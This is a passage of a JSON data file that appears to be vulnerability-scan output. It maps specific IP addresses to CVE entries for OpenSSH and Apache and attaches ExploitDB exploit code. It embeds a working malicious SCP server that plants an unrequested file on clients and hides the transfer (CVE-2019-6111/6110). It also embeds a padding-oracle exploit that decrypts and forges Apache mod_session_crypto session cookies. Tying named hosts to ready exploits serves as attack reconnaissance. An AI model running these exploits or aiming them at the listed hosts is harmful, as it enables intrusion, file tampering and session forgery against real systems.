                "code": "'''\r\nTitle:     SSHtranger Things\r\nAuthor:    Mark E. Haase <mhaase@hyperiongray.com>\r\nHomepage:  https://www.hyperiongray.com\r\nDate:      2019-01-17\r\nCVE:       CVE-2019-6111, CVE-2019-6110\r\nAdvisory:  https://sintonen.fi/advisories/scp-client-multiple-vulnerabilities.txt\r\nTested on: Ubuntu 18.04.1 LTS, OpenSSH client 7.6p1\r\n\r\nWe have nicknamed this \"SSHtranger Things\" because the bug is so old it could be\r\nexploited by an 8-bit Demogorgon. Tested on Python 3.6.7 and requires `paramiko`\r\npackage.\r\n\r\nThe server listens on port 2222. It accepts any username and password, and it\r\ngenerates a new host key every time you run it.\r\n\r\n    $ python3 sshtranger_things.py\r\n\r\nDownload a file using a vulnerable client. The local path must be a dot:\r\n\r\n    $ scp -P 2222 foo@localhost:test.txt .\r\n    The authenticity of host '[localhost]:2222 ([127.0.0.1]:2222)' can't be established.\r\n    RSA key fingerprint is SHA256:C7FhMqqiMpkqG9j+11S2Wv9lQYlN1jkDiipdeFMZT1w.\r\n    Are you sure you want to continue connecting (yes/no)? yes\r\n    Warning: Permanently added '[localhost]:2222' (RSA) to the list of known hosts.\r\n    foo@localhost's password:\r\n    test.txt                                       100%   32     0.7KB/s   00:00\r\n\r\nThe file you requested (e.g. test.txt) will be saved in your current directory.\r\nIf your client is vulnerable, you will have an additional file \"exploit.txt\"\r\ncreated in your current directory.\r\n\r\n    $ cat test.txt\r\n    This is the file you requested.\r\n    $ cat exploit.txt\r\n    SSHtranger Things\r\n\r\nThe interesting code is in ScpServer.send_file().\r\n'''\r\nimport base64\r\nimport gzip\r\nimport logging\r\nimport paramiko\r\nimport paramiko.rsakey\r\nimport socket\r\nimport threading\r\n\r\nlogging.basicConfig(level=logging.INFO)\r\n\r\ndummy = 'This is the file you requested.\\n'\r\npayload = gzip.decompress(base64.b64decode(\r\n    b'H4sIAAa+QFwC/51VQW4CMQy85xV+AX+qqrZwoFSo0orbHvbQQw9NIiH1Af0YLyndjZ2x46'\r\n    b'ygaIGs43jGTjIORJfzh3nIN/IwltH1b+LHeGdxHnXUsoCWD6yYyjt7AfA1XJdLDR8u5yRA'\r\n    b'1/lEjiHbHGafXOMVpySuZaH4Jk1lgjxoocN5YMhRoNhhpA5EWMhlRHBNCWogZYhOnmk2V7'\r\n    b'C4FJgwHxKSEwEzTskrQITtj1gYIurAhWUfsDbWIFyXlRwDc8okeZkCzNyjlMmcT4wxA39d'\r\n    b'zp8OsJDJsGV/wV3I0JwJLNXKlOxJAs5Z7WwqmUZMPZmzqupttkhPRd4ovE8jE0gNyQ5skM'\r\n    b'uVy4jk4BljnYwCQ2CUs53KtnKEYkucQJIEyoGud5wYXQUuXvimAYJMJyLlqkyQHlsK6XLz'\r\n    b'I6Q6m4WKYmOzjRxEhtXWBA1qrvmBVRgGGIoT1dIRKSN+yeaJQQKuNEEadONJjkcdI2iFC4'\r\n    b'Hs55bGI12K2rn1fuN1P4/DWtuwHQYdb+0Vunt5DDpS3+0MLaN7FF73II+PK9OungPEnZrc'\r\n    b'dIyWSE9DHbnVVP4hnF2B79CqV8nTxoWmlomuzjl664HiLbZSdrtEOdIYVqBaTeKdWNccJS'\r\n    b'J+NlZGQJZ7isJK0gs27N63dPn+oefjYU/DMGy2p7en4+7w+nJ8OG0eD/vwC6VpDqYpCwAA'\r\n))\r\n\r\nclass ScpServer(paramiko.ServerInterface):\r\n    def __init__(self):\r\n        self.event = threading.Event()\r\n\r\n    def check_auth_password(self, username, password):\r\n        logging.info('Authenticated with %s:%s', username, password)\r\n        return paramiko.AUTH_SUCCESSFUL\r\n\r\n    def check_channel_request(self, kind, chanid):\r\n        logging.info('Opened session channel %d', chanid)\r\n        if kind == \"session\":\r\n            return paramiko.OPEN_SUCCEEDED\r\n        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED\r\n\r\n    def check_channel_exec_request(self, channel, command):\r\n        command = command.decode('ascii')\r\n        logging.info('Approving exec request: %s', command)\r\n        parts = command.split(' ')\r\n        # Make sure that this is a request to get a file:\r\n        assert parts[0] == 'scp'\r\n        assert '-f' in parts\r\n        file = parts[-1]\r\n        # Send file from a new thread.\r\n        threading.Thread(target=self.send_file, args=(channel, file)).start()\r\n        return True\r\n\r\n    def send_file(self, channel, file):\r\n        '''\r\n        The meat of the exploit:\r\n            1. Send the requested file.\r\n            2. Send another file (exploit.txt) that was not requested.\r\n            3. Print ANSI escape sequences to stderr to hide the transfer of\r\n               exploit.txt.\r\n        '''\r\n        def wait_ok():\r\n            assert channel.recv(1024) == b'\\x00'\r\n        def send_ok():\r\n            channel.sendall(b'\\x00')\r\n\r\n        wait_ok()\r\n\r\n        logging.info('Sending requested file \"%s\" to channel %d', file,\r\n            channel.get_id())\r\n        command = 'C0664 {} {}\\n'.format(len(dummy), file).encode('ascii')\r\n        channel.sendall(command)\r\n        wait_ok()\r\n        channel.sendall(dummy)\r\n        send_ok()\r\n        wait_ok()\r\n\r\n        # This is CVE-2019-6111: whatever file the client requested, we send\r\n        # them 'exploit.txt' instead.\r\n        logging.info('Sending malicious file \"exploit.txt\" to channel %d',\r\n            channel.get_id())\r\n        command = 'C0664 {} exploit.txt\\n'.format(len(payload)).encode('ascii')\r\n        channel.sendall(command)\r\n        wait_ok()\r\n        channel.sendall(payload)\r\n        send_ok()\r\n        wait_ok()\r\n\r\n        # This is CVE-2019-6110: the client will display the text that we send\r\n        # to stderr, even if it contains ANSI escape sequences. We can send\r\n        # ANSI codes that clear the current line to hide the fact that a second\r\n        # file was transmitted..\r\n        logging.info('Covering our tracks by sending ANSI escape sequence')\r\n        channel.sendall_stderr(\"\\x1b[1A\".encode('ascii'))\r\n        channel.close()\r\n\r\ndef main():\r\n    logging.info('Creating a temporary RSA host key...')\r\n    host_key = paramiko.rsakey.RSAKey.generate(1024)\r\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\r\n    sock.bind(('localhost', 2222))\r\n    sock.listen(0)\r\n    logging.info('Listening on port 2222...')\r\n\r\n    while True:\r\n        client, addr = sock.accept()\r\n        logging.info('Received connection from %s:%s', *addr)\r\n        transport = paramiko.Transport(client)\r\n        transport.add_server_key(host_key)\r\n        server = ScpServer()\r\n        transport.start_server(server=server)\r\n\r\nif __name__ == '__main__':\r\n    main()",
                "description": "OpenSSH SCP Client - Write Arbitrary Files",
                "author": "Harry Sintonen",
                "_id": 46516,
                "source": "ExploitDB",
                "platform": "multiple",
                "date": "2019-01-11T00:00:00+00:00",
                "cve": [
                    "CVE-2019-6111",
                    "CVE-2019-6110"
                ],
                "type": "remote",
                "port": 0
            }
        ]
    },
    "152.1.227.75": {
        "CVE-2018-15919": [
            {
                "source": "CVE",
                "_id": "2018-15919",
                "description": "Remotely observable behaviour in auth-gss2.c in OpenSSH through 7.8 could be used by remote attackers to detect existence of users on a target system when GSS2 is in use. NOTE: the discoverer states 'We understand that the OpenSSH developers do not want to treat such a username enumeration (or \"oracle\") as a vulnerability.'",
                "osvdb": [],
                "bid": [
                    105163
                ],
                "cve": [
                    "CVE-2018-15919"
                ],
                "msb": []
            }
        ],
        "CVE-2017-15906": [
            {
                "source": "CVE",
                "_id": "2017-15906",
                "description": "The process_open function in sftp-server.c in OpenSSH before 7.6 does not properly prevent write operations in readonly mode, which allows attackers to create zero-length files.",
                "osvdb": [],
                "bid": [
                    101552
                ],
                "cve": [
                    "CVE-2017-15906"
                ],
                "msb": []
            }
        ]
    },
    "152.1.227.126": {
        "CVE-2018-15919": [
            {
                "source": "CVE",
                "_id": "2018-15919",
                "description": "Remotely observable behaviour in auth-gss2.c in OpenSSH through 7.8 could be used by remote attackers to detect existence of users on a target system when GSS2 is in use. NOTE: the discoverer states 'We understand that the OpenSSH developers do not want to treat such a username enumeration (or \"oracle\") as a vulnerability.'",
                "osvdb": [],
                "bid": [
                    105163
                ],
                "cve": [
                    "CVE-2018-15919"
                ],
                "msb": []
            }
        ]
    },
    "152.1.227.151": {
        "CVE-2018-15919": [
            {
                "source": "CVE",
                "_id": "2018-15919",
                "description": "Remotely observable behaviour in auth-gss2.c in OpenSSH through 7.8 could be used by remote attackers to detect existence of users on a target system when GSS2 is in use. NOTE: the discoverer states 'We understand that the OpenSSH developers do not want to treat such a username enumeration (or \"oracle\") as a vulnerability.'",
                "osvdb": [],
                "bid": [
                    105163
                ],
                "cve": [
                    "CVE-2018-15919"
                ],
                "msb": []
            }
        ]
    },
    "152.1.227.152": {},
    "152.1.227.182": {
        "CVE-2018-15919": [
            {
                "source": "CVE",
                "_id": "2018-15919",
                "description": "Remotely observable behaviour in auth-gss2.c in OpenSSH through 7.8 could be used by remote attackers to detect existence of users on a target system when GSS2 is in use. NOTE: the discoverer states 'We understand that the OpenSSH developers do not want to treat such a username enumeration (or \"oracle\") as a vulnerability.'",
                "osvdb": [],
                "bid": [
                    105163
                ],
                "cve": [
                    "CVE-2018-15919"
                ],
                "msb": []
            }
        ],
        "CVE-2017-15906": [
            {
                "source": "CVE",
                "_id": "2017-15906",
                "description": "The process_open function in sftp-server.c in OpenSSH before 7.6 does not properly prevent write operations in readonly mode, which allows attackers to create zero-length files.",
                "osvdb": [],
                "bid": [
                    101552
                ],
                "cve": [
                    "CVE-2017-15906"
                ],
                "msb": []
            }
        ]
    },
    "152.1.227.210": {
        "CVE-2014-0117": [
            {
                "source": "CVE",
                "_id": "2014-0117",
                "description": "The mod_proxy module in the Apache HTTP Server 2.4.x before 2.4.10, when a reverse proxy is enabled, allows remote attackers to cause a denial of service (child-process crash) via a crafted HTTP Connection header.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2014-0117"
                ],
                "msb": []
            }
        ],
        "CVE-2014-0118": [
            {
                "source": "CVE",
                "_id": "2014-0118",
                "description": "The deflate_in_filter function in mod_deflate.c in the mod_deflate module in the Apache HTTP Server before 2.4.10, when request body decompression is enabled, allows remote attackers to cause a denial of service (resource consumption) via crafted request data that decompresses to a much larger size.",
                "osvdb": [],
                "bid": [
                    68745
                ],
                "cve": [
                    "CVE-2014-0118"
                ],
                "msb": []
            }
        ],
        "CVE-2016-0736": [
            {
                "source": "CVE",
                "_id": "2016-0736",
                "description": "In Apache HTTP Server versions 2.4.0 to 2.4.23, mod_session_crypto was encrypting its data/cookie using the configured ciphers with possibly either CBC or ECB modes of operation (AES256-CBC by default), hence no selectable or builtin authenticated encryption. This made it vulnerable to padding oracle attacks, particularly with CBC.",
                "osvdb": [],
                "bid": [
                    95078
                ],
                "cve": [
                    "CVE-2016-0736"
                ],
                "msb": []
            },
            {
                "code": "'''\r\nAdvisory: Padding Oracle in Apache mod_session_crypto\r\n\r\nDuring a penetration test, RedTeam Pentesting discovered a Padding\r\nOracle vulnerability in mod_session_crypto of the Apache web server.\r\nThis vulnerability can be exploited to decrypt the session data and even\r\nencrypt attacker-specified data.\r\n\r\n\r\nDetails\r\n=======\r\n\r\nProduct: Apache HTTP Server mod_session_crypto\r\nAffected Versions: 2.3 to 2.5\r\nFixed Versions: 2.4.25\r\nVulnerability Type: Padding Oracle\r\nSecurity Risk: high\r\nVendor URL: https://httpd.apache.org/docs/trunk/mod/mod_session_crypto.html\r\nVendor Status: fixed version released\r\nAdvisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2016-001.txt\r\nAdvisory Status: published\r\nCVE: CVE-2016-0736\r\nCVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0736\r\n\r\n\r\nIntroduction\r\n============\r\n\r\nThe module mod_session_crypto of the Apache HTTP Server can be used in\r\nconjunction with the modules mod_session and mod_session_cookie to store\r\nsession data in an encrypted cookie within the users' browsers. This\r\navoids server-side session state so that incoming HTTP requests can be\r\neasily distributed amongst a number of application web servers which do\r\nnot need to share session state.\r\n\r\n\r\nMore Details\r\n============\r\n\r\nThe module mod_session_crypto uses symmetric cryptography to encrypt and\r\ndecrypt session data and uses mod_session to store the encrypted data in\r\na cookie (usually called \"session\") within the user's browser. The\r\ndecrypted session is then made available to the application in an\r\nenvironment variable (in case of a CGI script) or in a custom HTTP\r\nrequest header. The application can add a custom HTTP response header\r\n(usually \"X-Replace-Session\") which instructs the HTTP server to replace\r\nthe session's content with the value of the header. Detailed\r\ninstructions to set up mod_session and mod_session_crypto can be found\r\nin the documentation:\r\nhttps://httpd.apache.org/docs/2.4/mod/mod_session.html#basicexamples\r\n\r\nThe module mod_session_crypto is configured to use either 3DES or AES\r\nwith various key sizes, defaulting to AES256. Encryption is handled by\r\nthe function \"encrypt_string\":\r\n\r\nmodules/session/mod_session_crypto.c\r\n------------------------------------------------------------------------\r\n/**\r\n * Encrypt the string given as per the current config.\r\n *\r\n * Returns APR_SUCCESS if successful.\r\n */\r\nstatic apr_status_t encrypt_string(request_rec * r, const apr_crypto_t *f,\r\n        session_crypto_dir_conf *dconf, const char *in, char **out)\r\n{\r\n[...]\r\n    apr_crypto_key_t *key = NULL;\r\n[...]\r\n    const unsigned char *iv = NULL;\r\n[...]\r\n\r\n    /* use a uuid as a salt value, and prepend it to our result */\r\n    apr_uuid_get(&salt);\r\n\r\n[...]\r\n\r\n    res = apr_crypto_passphrase(&key, &ivSize, passphrase,\r\n            strlen(passphrase),\r\n            (unsigned char *) (&salt), sizeof(apr_uuid_t),\r\n            *cipher, APR_MODE_CBC, 1, 4096, f, r->pool);\r\n\r\n[...]\r\n\r\n    res = apr_crypto_block_encrypt_init(&block, &iv, key, &blockSize, r->pool);\r\n[...]\r\n    res = apr_crypto_block_encrypt(&encrypt, &encryptlen, (unsigned char *)in,\r\n            strlen(in), block);\r\n[...]\r\n    res = apr_crypto_block_encrypt_finish(encrypt + encryptlen, &tlen, block);\r\n[...]\r\n\r\n    /* prepend the salt and the iv to the result */\r\n    combined = apr_palloc(r->pool, ivSize + encryptlen + sizeof(apr_uuid_t));\r\n    memcpy(combined, &salt, sizeof(apr_uuid_t));\r\n    memcpy(combined + sizeof(apr_uuid_t), iv, ivSize);\r\n    memcpy(combined + sizeof(apr_uuid_t) + ivSize, encrypt, encryptlen);\r\n\r\n    /* base64 encode the result */\r\n    base64 = apr_palloc(r->pool, apr_base64_encode_len(ivSize + encryptlen +\r\n                    sizeof(apr_uuid_t) + 1)\r\n            * sizeof(char));\r\n[...]\r\n    return res;\r\n}\r\n------------------------------------------------------------------------\r\n\r\nThe source code shows that an encryption key is derived from the\r\nconfigured password and a randomly chosen salt by calling the function\r\n\"apr_crypto_passphrase\". This function internally uses PBKDF2 to derive\r\nthe key. The data is then encrypted and the salt and IV prepended to the\r\nencrypted data. Before returning to the caller, the result is encoded as\r\nbase64.\r\n\r\nThis procedure does not guarantee integrity of the ciphertext, so the\r\nApache module is unable to detect whether a session sent back to the\r\nserver has been tampered with. Depending on the application this often\r\nmeans that attackers are able to exploit a Padding Oracle vulnerability.\r\nThis allows decrypting the session and encrypting arbitrary data chosen\r\nby the attacker.\r\n\r\n\r\nProof of Concept\r\n================\r\n\r\nThe vulnerability can be reproduced as follows. First, the modules\r\nmod_session, mod_session_crypto and mod_session_cookie are enabled and\r\nconfigured:\r\n\r\n------------------------------------------------------------------------\r\nSession On\r\nSessionEnv On\r\nSessionCookieName session path=/\r\nSessionHeader X-Replace-Session\r\nSessionCryptoPassphrase RedTeam\r\n------------------------------------------------------------------------\r\n\r\nIn addition, CGI scripts are enabled for a folder and the following CGI\r\nscript is saved as \"status.rb\" and is made available to clients:\r\n\r\n------------------------------------------------------------------------\r\n#!/usr/bin/env ruby\r\n\r\nrequire 'cgi'\r\n\r\ncgi = CGI.new\r\ndata = CGI.parse(ENV['HTTP_SESSION'])\r\n\r\nif data.has_key? 'username'\r\n        puts\r\n        puts \"your username is %s\" % data['username']\r\n        exit\r\nend\r\n\r\nputs \"X-Replace-Session: username=guest&timestamp=\" + Time.now.strftime(\"%s\")\r\nputs\r\nputs \"not logged in\"\r\n------------------------------------------------------------------------\r\n\r\nOnce the CGI script is correctly set up, the command-line HTTP client curl\r\ncan be used to access it:\r\n\r\n------------------------------------------------------------------------\r\n$ curl -i http://127.0.0.1:8080/cgi-bin/status.rb\r\nHTTP/1.1 200 OK\r\nDate: Tue, 19 Jan 2016 13:23:19 GMT\r\nServer: Apache/2.4.10 (Ubuntu)\r\nSet-Cookie: session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vpLQ\r\n   l1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=;path=/\r\nCache-Control: no-cache\r\nSet-Cookie: session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vpLQ\r\n   l1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=;path=/\r\nTransfer-Encoding: chunked\r\nContent-Type: application/x-ruby\r\n\r\nnot logged in\r\n------------------------------------------------------------------------\r\n\r\nThe example shows that a new encrypted cookie with the name \"session\" is\r\nreturned, and the response body contains the text \"not logged in\".\r\nCalling the script again with the cookie just returned reveals that the\r\nusername in the session is set to \"guest\":\r\n\r\n------------------------------------------------------------------------\r\n$ curl -b session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vp\\\r\nLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU= \\\r\nhttp://127.0.0.1:8080/cgi-bin/status.rb\r\n\r\nyour username is guest\r\n------------------------------------------------------------------------\r\n\r\nSending a modified cookie ending in \"u=\" instead of \"U=\" will invalidate\r\nthe padding at the end of the ciphertext, so the session cannot be\r\ndecrypted correctly and is therefore not passed to the CGI script, which\r\nreturns the text \"not logged in\" again:\r\n\r\n------------------------------------------------------------------------\r\n$ curl -b session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vp\\\r\nLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRu= \\\r\nhttp://127.0.0.1:8080/cgi-bin/status.rb\r\n\r\nnot logged in\r\n------------------------------------------------------------------------\r\n\r\nThis verifies the existence of the Padding Oracle vulnerability. The\r\nPython library[1] python-paddingoracle was then used to implement\r\ndecrypting the session by exploiting the Padding Oracle vulnerability.\r\n\r\nexploit.py\r\n------------------------------------------------------------------------\r\n'''\r\n\r\nfrom paddingoracle import BadPaddingException, PaddingOracle\r\nfrom base64 import b64encode, b64decode\r\nimport requests\r\n\r\nclass PadBuster(PaddingOracle):\r\n    def __init__(self, valid_cookie, **kwargs):\r\n        super(PadBuster, self).__init__(**kwargs)\r\n        self.wait = kwargs.get('wait', 2.0)\r\n        self.valid_cookie = valid_cookie\r\n\r\n    def oracle(self, data, **kwargs):\r\n        v = b64encode(self.valid_cookie+data)\r\n\r\n        response = requests.get('http://127.0.0.1:8080/cgi-bin/status.rb',\r\n                cookies=dict(session=v), stream=False, timeout=5, verify=False)\r\n\r\n        if 'username' in response.content:\r\n            logging.debug('No padding exception raised on %r', v)\r\n            return\r\n\r\n        raise BadPaddingException\r\n\r\nif __name__ == '__main__':\r\n    import logging\r\n    import sys\r\n\r\n    if not sys.argv[2:]:\r\n        print 'Usage: [encrypt|decrypt] <session value> <plaintext>'\r\n        sys.exit(1)\r\n\r\n    logging.basicConfig(level=logging.WARN)\r\n    mode = sys.argv[1]\r\n    session = b64decode(sys.argv[2])\r\n    padbuster = PadBuster(session)\r\n\r\n    if mode == \"decrypt\":\r\n        cookie = padbuster.decrypt(session[32:], block_size=16, iv=session[16:32])\r\n        print('Decrypted session:\\n%r' % cookie)\r\n    elif mode == \"encrypt\":\r\n        key = session[0:16]\r\n        plaintext = sys.argv[3]\r\n\r\n        s = padbuster.encrypt(plaintext, block_size=16)\r\n\r\n        data = b64encode(key+s[0:len(s)-16])\r\n        print('Encrypted session:\\n%s' % data)\r\n    else:\r\n        print \"invalid mode\"\r\n        sys.exit(1)\r\n\r\n'''\r\n------------------------------------------------------------------------\r\n\r\nThis Python script can then be used to decrypt the session:\r\n\r\n------------------------------------------------------------------------\r\n$ time python exploit.py decrypt sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4\\\r\nHztmf0CFsp1vpLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=\r\nDecrypted session:\r\nb'username=guest&timestamp=1453282205\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r'\r\n\r\nreal    6m43.088s\r\nuser    0m15.464s\r\nsys 0m0.976s\r\n------------------------------------------------------------------------\r\n\r\nIn this sample application, the username and a timestamp are included in\r\nthe session data. The Python script can also be used to encrypt a new\r\nsession containing the username \"admin\":\r\n\r\n------------------------------------------------------------------------\r\n$ time python exploit.py encrypt sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4\\\r\nHztmf0CFsp1vpLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYB\\\r\nRU= username=admin\r\n\r\nEncrypted session:\r\nsxGTJsP1TqiPrbKVM1GAXPZQZNxCxjK938K9tufqX9xDLFciz7zmQ/GLFjF4pcXY\r\n\r\nreal3m38.002s\r\nusers0m8.536s\r\nsys0m0.512s\r\n\r\n------------------------------------------------------------------------\r\n\r\nSending this newly encrypted session to the server shows that the\r\nusername is now \"admin\":\r\n\r\n------------------------------------------------------------------------\r\n$ curl -b session=sxGTJsP1TqiPrbKVM1GAXPZQZNxCxjK938K9tufqX9xDLFciz7\\\r\nzmQ/GLFjF4pcXY http://127.0.0.1:8080/cgi-bin/status.rb\r\n\r\nyour username is admin\r\n------------------------------------------------------------------------\r\n\r\n\r\nWorkaround\r\n==========\r\n\r\nUse a different means to store the session, e.g. in a database by using\r\nmod_session_dbd.\r\n\r\n\r\nFix\r\n===\r\n\r\nUpdate to Apache HTTP version 2.4.25 (see [2]).\r\n\r\n\r\nSecurity Risk\r\n=============\r\n\r\nApplications which use mod_session_crypto usually store sensitive values\r\nin the session and rely on an attacker's inability to decrypt or modify\r\nthe session. Successful exploitation of the Padding Oracle vulnerability\r\nsubverts this mechanism and allows to construct sessions with arbitrary\r\nattacker-specified content. Depending on the application this may\r\ncompletely subvert the application's security. Therefore, this\r\nvulnerability poses a high risk.\r\n\r\n\r\nTimeline\r\n========\r\n\r\n2016-01-11 Vulnerability identified\r\n2016-01-12 Customer approved disclosure to vendor\r\n2016-01-12 CVE number requested\r\n2016-01-20 Vendor notified\r\n2016-01-22 Vendor confirmed the vulnerability\r\n2016-02-03 Vendor provided patch\r\n2016-02-04 Apache Security Team assigned CVE number\r\n2016-03-03 Requested status update from vendor, no response\r\n2016-05-02 Requested status update from vendor, no response\r\n2016-07-14 Requested status update and roadmap from vendor\r\n2016-07-21 Vendor confirms working on a new released and inquired whether the\r\n           patch fixes the vulnerability\r\n2016-07-22 RedTeam confirms\r\n2016-08-24 Requested status update from vendor\r\n2016-08-29 Vendor states that there is no concrete timeline\r\n2016-12-05 Vendor announces a release\r\n2016-12-20 Vendor released fixed version\r\n2016-12-23 Advisory released\r\n\r\n\r\nReferences\r\n==========\r\n\r\n[1] https://github.com/mwielgoszewski/python-paddingoracle\r\n[2] http://httpd.apache.org/security/vulnerabilities_24.html\r\n\r\n\r\nRedTeam Pentesting GmbH\r\n=======================\r\n\r\nRedTeam Pentesting offers individual penetration tests performed by a\r\nteam of specialised IT-security experts. Hereby, security weaknesses in\r\ncompany networks or products are uncovered and can be fixed immediately.\r\n\r\nAs there are only few experts in this field, RedTeam Pentesting wants to\r\nshare its knowledge and enhance the public knowledge with research in\r\nsecurity-related areas. The results are made available as public\r\nsecurity advisories.\r\n\r\nMore information about RedTeam Pentesting can be found at:\r\nhttps://www.redteam-pentesting.de/\r\n'''",
                "description": "Apache mod_session_crypto - Padding Oracle",
                "author": "RedTeam Pentesting GmbH",
                "_id": 40961,
                "source": "ExploitDB",
                "platform": "multiple",
                "date": "2016-12-23T00:00:00+00:00",
                "cve": [
                    "CVE-2016-0736"
                ],
                "type": "webapps",
                "port": 0
            }
        ],
        "CVE-2015-3185": [
            {
                "source": "CVE",
                "_id": "2015-3185",
                "description": "The ap_some_auth_required function in server/request.c in the Apache HTTP Server 2.4.x before 2.4.14 does not consider that a Require directive may be associated with an authorization setting rather than an authentication setting, which allows remote attackers to bypass intended access restrictions in opportunistic circumstances by leveraging the presence of a module that relies on the 2.2 API behavior.",
                "osvdb": [],
                "bid": [
                    75965
                ],
                "cve": [
                    "CVE-2015-3185"
                ],
                "msb": []
            }
        ],
        "CVE-2015-3184": [
            {
                "source": "CVE",
                "_id": "2015-3184",
                "description": "mod_authz_svn in Apache Subversion 1.7.x before 1.7.21 and 1.8.x before 1.8.14, when using Apache httpd 2.4.x, does not properly restrict anonymous access, which allows remote anonymous users to read hidden files via the path name.",
                "osvdb": [],
                "bid": [
                    76274
                ],
                "cve": [
                    "CVE-2015-3184"
                ],
                "msb": []
            }
        ],
        "CVE-2018-1312": [
            {
                "source": "CVE",
                "_id": "2018-1312",
                "description": "In Apache httpd 2.2.0 to 2.4.29, when generating an HTTP Digest authentication challenge, the nonce sent to prevent reply attacks was not correctly generated using a pseudo-random seed. In a cluster of servers using a common Digest authentication configuration, HTTP requests could be replayed across servers by an attacker without detection.",
                "osvdb": [],
                "bid": [
                    103524
                ],
                "cve": [
                    "CVE-2018-1312"
                ],
                "msb": []
            }
        ]
    },
    "152.1.228.43": {
        "CVE-2019-0196": [
            {
                "source": "CVE",
                "_id": "2019-0196",
                "description": "A vulnerability was found in Apache HTTP Server 2.4.17 to 2.4.38. Using fuzzed network input, the http/2 request handling could be made to access freed memory in string comparison when determining the method of a request and thus process the request incorrectly.",
                "osvdb": [],
                "bid": [
                    107669
                ],
                "cve": [
                    "CVE-2019-0196"
                ],
                "msb": []
            }
        ]
    },
    "152.1.228.44": {},
    "152.1.228.52": {}
}